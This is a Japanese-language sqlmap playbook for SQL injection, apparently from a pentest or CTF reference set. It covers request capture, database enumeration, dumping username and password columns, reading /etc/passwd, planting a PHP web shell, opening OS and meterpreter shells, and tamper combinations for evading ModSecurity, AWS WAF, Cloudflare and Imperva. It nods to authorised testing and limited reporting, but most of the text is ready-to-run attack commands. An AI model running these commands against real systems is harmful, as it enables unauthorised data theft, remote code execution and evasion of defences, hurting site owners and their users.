# SQL Injection — sqlmap 自動化

`references/sql-manual.md` で当たりがついた後の列挙 / 抽出 / RCE 試験の自動化を扱う。

## Phase 1 — request の取り込み

最も確実なのは burp / mitmproxy で raw request を保存し `-r` で渡す方法:

```
sqlmap -r request.txt --batch --random-agent
```

URL / form / cookie 別に渡す場合:

```
sqlmap -u 'https://target/api/items?id=1'                    --batch
sqlmap -u 'https://target/login' --data 'user=a&pass=b' -p user --batch
sqlmap -u 'https://target/dash'  --cookie 'sid=abc; uid=5*' --level 2 --batch
sqlmap -u 'https://target/api'   --headers 'X-User: 1*'    --level 3 --batch
```

`*` で注入位置を明示。

## Phase 2 — レベルとリスク調整

| flag | 効果 |
|---|---|
| `--level=1..5` | 試験する payload セットの広さ。3 で cookie / header、5 で User-Agent / Referer |
| `--risk=1..3` | 副作用ある payload の許容 (OR boolean / time / stacked)。本番には `1`、CTF/隔離環境なら `3` |
| `--threads=N` | 並列数。default 1。負荷気にしないなら 5–10 |
| `--technique=BEUSTQ` | B=Boolean / E=Error / U=Union / S=Stacked / T=Time / Q=inline。絞り込み |

## Phase 3 — 列挙の段階分け

```
sqlmap -u <url> --dbs                                      # database 一覧
sqlmap -u <url> -D <db> --tables                          # table 一覧
sqlmap -u <url> -D <db> -T <table> --columns              # column 一覧
sqlmap -u <url> -D <db> -T users -C 'id,username,password' --dump --start=1 --stop=10
sqlmap -u <url> --schema --batch                          # 全 schema 一括
```

## Phase 4 — 権限確認と escalate

```
sqlmap -u <url> --current-user --current-db --is-dba --hostname --privileges
```

DBA なら:

```
sqlmap -u <url> --file-read='/etc/passwd'                 # ファイル読取
sqlmap -u <url> --file-write=local.php --file-dest=/var/www/html/x.php
sqlmap -u <url> --os-cmd='id'                             # コマンド実行
sqlmap -u <url> --os-shell                                # 対話 shell
sqlmap -u <url> --os-pwn                                  # meterpreter
```

エンジン別ロジック:

| DBMS | OS 実行経路 |
|---|---|
| MySQL | `INTO OUTFILE` で web shell 設置 / UDF 注入 |
| MSSQL | `xp_cmdshell` (有効化必要) / sp_execute_external_script |
| PostgreSQL | `COPY ... TO PROGRAM` (9.3+) / language plperlu |
| Oracle | XMLType + SQL injection chains |

## Phase 5 — WAF 回避 (`--tamper`)

```
sqlmap --list-tampers                                     # 全一覧
sqlmap -u <url> --tamper=space2comment,between,randomcase
sqlmap -u <url> --tamper=modsecurityversioned             # ModSecurity 用
sqlmap -u <url> --tamper=charencode,equaltolike           # 緩い WAF 用
sqlmap -u <url> --tamper=base64encode                     # base64 受け入れ endpoint 用
```

組合せの定石:

```
ModSecurity              : space2comment,between,modsecurityversioned
AWS WAF (基本)           : space2comment,charencode
Cloudflare (基本)        : space2randomblank,charunicodeencode
Imperva                  : modsecurityzeroversioned,space2morehash
```

## Phase 6 — 認証付きエンドポイント

```
sqlmap -u <url> --auth-type=Basic --auth-cred='user:pass'
sqlmap -u <url> --headers='Authorization: Bearer eyJ...'
sqlmap -u <url> --cookie='session=...; csrf=...'
sqlmap -u <url> --csrf-token='csrf' --csrf-url='https://target/getcsrf'   # 動的 CSRF 自動取得
sqlmap -u <url> --safe-url='https://target/' --safe-freq=5                # session keepalive
```

## Phase 7 — ノイズ抑制と運用

- `--purge` で test 後の session を消す
- `--output-dir=<path>` で artefact 隔離
- `--batch --answers="dump format=CSV,quit=Y"` で対話質問にデフォルト
- `--proxy=http://127.0.0.1:8080` で burp 連携
- `--flush-session` で前回キャッシュ無視

## Phase 8 — 結果の最小整形

CTF: flag を含む 1 行を抽出。
bug bounty / pentest 報告: 抽出件数のみ控え、実データは出さない。

```
- 注入点 / DBMS / 技法
- DBA 権限の有無 / file_priv の有無
- accessible schema 数 / 主要 table 件数 (内容は出さない)
- 認証バイパス PoC 1 例
```

## 二次注入と組合せ

`--second-url` / `--second-req` で二次注入の自動化が可能 (詳細は `references/sql-second-order.md`)。
